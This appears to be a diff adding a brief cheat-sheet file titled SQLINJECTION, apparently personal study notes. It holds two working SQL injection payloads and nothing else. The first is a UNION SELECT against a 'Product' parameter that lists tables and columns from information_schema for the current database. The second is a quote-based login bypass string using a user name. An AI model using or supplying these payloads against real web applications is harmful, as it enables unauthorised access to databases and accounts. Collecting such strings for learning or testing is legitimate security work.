@@ -1,0 +1,6 @@
+SQLINJECTION
+Product?= 1 [AND / OR] ---> UNION SELECT table_schema,table_name,column_name from information_schema.columns where table_schema = database()
+ 
+'tom' or 1='1;#
+
+
